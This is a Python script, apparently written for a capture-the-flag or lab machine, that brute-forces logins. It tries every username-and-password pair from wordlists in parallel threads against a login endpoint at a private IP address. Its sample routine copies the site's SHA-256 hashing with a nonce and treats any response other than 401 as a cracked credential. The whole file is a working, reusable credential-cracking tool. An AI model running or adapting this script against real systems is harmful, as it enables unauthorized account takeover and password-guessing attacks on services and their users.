#!/usr/bin/python3

import argparse
import requests
import itertools
import concurrent.futures
import hashlib
import random
import math
import string
from tqdm import tqdm
from colorama import Fore, Style

DEFAULT_MAX_WORKERS = 16

def print_info(prompt, end: str | None = '\n', _tqdm: bool | None = False):
    s = f'{Fore.RESET}[{Fore.BLUE}{Style.BRIGHT}*{Style.NORMAL}{Fore.RESET}] {prompt}'
    if not _tqdm:
        print(s, end=end, flush=True)
    else:
        tqdm.write(s, end=end)

def print_error(prompt, end: str | None = '\n', _tqdm: bool | None = False):
    s = f'{Fore.RESET}[{Fore.RED}{Style.BRIGHT}-{Style.NORMAL}{Fore.RESET}] {prompt}'
    if not _tqdm:
        print(s, end=end, flush=True)
    else:
        tqdm.write(s, end=end)

def print_success(prompt, end: str | None = '\n', _tqdm: bool | None = False):
    s = f'{Fore.RESET}[{Fore.GREEN}{Style.BRIGHT}+{Style.NORMAL}{Fore.RESET}] {prompt}'
    if not _tqdm:
        print(s, end=end, flush=True)
    else:
        tqdm.write(s, end=end)

# unused
def print_warning(prompt, end: str | None = '\n', _tqdm: bool | None = False):
    s = f'{Fore.RESET}[{Fore.YELLOW}{Style.BRIGHT}!{Style.NORMAL}{Fore.RESET}] {prompt}'
    if not _tqdm:
        print(s, end=end, flush=True)
    else:
        tqdm.write(s, end=end)

def get_file_lines(filepath):
    with open(filepath, 'r') as f:
        lines = f.readlines()
    return list(line.strip() for line in lines)



# define your own function below
# this function will be called with all combinations of usernames and passwords
# it should return True if credentials passed, False otherwise
#
# example implementation
def try_credentials(username : str, password : str):

    def generateNonce():
        NONCE_ALPHABET = string.ascii_letters + string.digits
        NONCE_LENGTH = 12
        retval = ''
        for i in range(NONCE_LENGTH):
            retval += NONCE_ALPHABET[math.floor(random.random() * len(NONCE_ALPHABET))]
        return retval

    URL = 'http://10.10.11.224:55555/6ejl1w8/login'
    nonce = generateNonce()
    m = hashlib.sha256()
    m.update(password.encode())
    pass_hash = m.hexdigest()
    m = hashlib.sha256()
    m.update((pass_hash + nonce).encode())
    hash = m.hexdigest()
    response = requests.request(
        method='POST',
        url=URL,
        headers={
            'Host': '10.10.11.224:55555',
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
            },
        data=f'username={username}&hash={hash}&nonce={nonce}'
    )
    if response.status_code == 401:
        return False
    return True

def main():
    parser = argparse.ArgumentParser(
        prog='CredHack',
        description='Script used to help in automation of cracking various forms of authentication',
        epilog='Piotr Pazdan'
    )
    parser.add_argument('-L', '--users', help='path to file with users (required)')
    parser.add_argument('-P', '--passwords', help='path to file with passwords (required)')
    parser.add_argument('-m', '--max-workers', type=int, help='max workers for thread pool')

    args = parser.parse_args()
    if args.users is None or args.passwords is None:
        parser.print_help()
        return

    print_info('Reading users and passwords to memory...', end=' ')
    try:
        usernames = get_file_lines(args.users)
        passwords = get_file_lines(args.passwords)
    except Exception as e:
        print_error(e)
        exit(1)
    cred_comb = list(itertools.product(usernames, passwords))
    print(f'Done, {len(cred_comb)} total credential combinations cached')
    max_workers = args.max_workers if args.max_workers is not None else DEFAULT_MAX_WORKERS
    creds_cracked = 0

    print_info(f'Starting workers (max: {max_workers})...')
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_try_credentials = {executor.submit(try_credentials, *cred): cred for cred in cred_comb}
        print_info('Cracking...')
        with tqdm(total=len(cred_comb)) as pbar:
            for future in concurrent.futures.as_completed(future_try_credentials):
                username, password = future_try_credentials[future]
                try:
                    result = future.result()
                except Exception as e:
                    print_error(e)
                    exit(1)
                if result:
                    print_success(f'{Style.BRIGHT}{Fore.BLUE}{username}{Style.NORMAL}{Fore.RESET}:{Style.BRIGHT}{Fore.BLUE}{password}{Style.NORMAL}{Fore.RESET}', _tqdm=True)
                    creds_cracked += 1
                pbar.update()

    print()
    print_info(f'Session exhausted; {creds_cracked} credential(s) matched.')

if __name__ == '__main__':
    main()